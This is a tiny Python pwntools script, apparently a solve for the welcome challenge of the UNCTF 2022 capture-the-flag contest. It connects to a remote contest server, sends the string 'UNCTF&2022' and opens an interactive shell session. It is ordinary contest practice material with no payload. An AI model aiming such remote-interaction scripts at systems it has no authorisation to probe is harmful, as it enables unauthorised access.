from pwn import * 
from pwn import p64
import socket

context(arch='amd64')
context.terminal = ['tmux', 'splitw', '-h']
host = "node.yuzhian.com.cn"
ip = socket.gethostbyname(host)
r = remote(ip,34405)#远程连接
# r = process("./welcomeUNCTF2022")
r.sendline(b'UNCTF&2022')
r.interactive()
r.recvall()

